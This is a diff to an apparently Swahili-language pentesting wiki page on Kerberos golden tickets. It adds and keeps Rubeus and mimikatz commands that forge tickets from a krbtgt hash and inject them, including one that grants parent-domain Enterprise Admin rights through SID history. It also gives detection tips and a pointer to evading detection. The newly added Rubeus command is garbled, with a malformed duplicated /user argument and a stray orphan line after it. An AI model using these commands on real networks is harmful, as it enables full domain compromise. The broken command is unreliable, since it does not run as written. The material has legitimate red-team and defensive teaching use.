@@ -16,6 +16,12 @@ python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
 ```
 
 ```bash:From Windows
+# Rubeus
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+.\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+/rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /ptt
 #mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
 .\Rubeus.exe ptt /ticket:ticket.kirbi
@@ -28,17 +34,17 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 
 ### Kupita njia za kawaida za kugundua
 
-Njia za kawaida zaidi za kugundua tiketi ya dhahabu ni kwa **kukagua trafiki ya Kerberos** kwenye waya. Kwa kawaida, Mimikatz **inasaini TGT kwa miaka 10**, ambayo itajitokeza kama isiyo ya kawaida katika maombi ya TGS yanayofanywa nayo.
+Njia za kawaida zaidi za kugundua tiketi ya dhahabu ni kwa **kukagua trafiki ya Kerberos** kwenye waya. Kwa kawaida, Mimikatz **inasaini TGT kwa miaka 10**, ambayo itajitokeza kama ya kipekee katika maombi ya TGS yanayofanywa nayo.
 
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
-Tumia vigezo vya `/startoffset`, `/endin` na `/renewmax` kudhibiti mwanzo wa offset, muda na upya wa juu (yote kwa dakika).
+Tumia vigezo vya `/startoffset`, `/endin` na `/renewmax` kudhibiti mwanzo wa offset, muda na upya wa juu (vyote kwa dakika).
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
 Samahani, muda wa TGT hauandikwi katika 4769, hivyo huwezi kupata taarifa hii katika kumbukumbu za matukio ya Windows. Hata hivyo, kile unachoweza kuhusisha ni **kuona 4769 bila 4768 ya awali**. **Haiwezekani kuomba TGS bila TGT**, na ikiwa hakuna rekodi ya TGT iliyotolewa, tunaweza kudhani kwamba ilitengenezwa nje ya mtandao.
 
-Ili **kuepuka ugunduzi huu** angalia tiketi za diamond:
+Ili **kuepuka ugunduzi huu** angalia tiketi za almasi:
 
 {{#ref}}
 diamond-ticket.md
@@ -52,7 +58,7 @@ diamond-ticket.md
 
 Hila nyingine ndogo ambazo walinzi wanaweza kufanya ni **kuonya kuhusu 4769 kwa watumiaji nyeti** kama akaunti ya msimamizi wa eneo la msingi.
 
-## Marejeo
+## Marejeleo
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
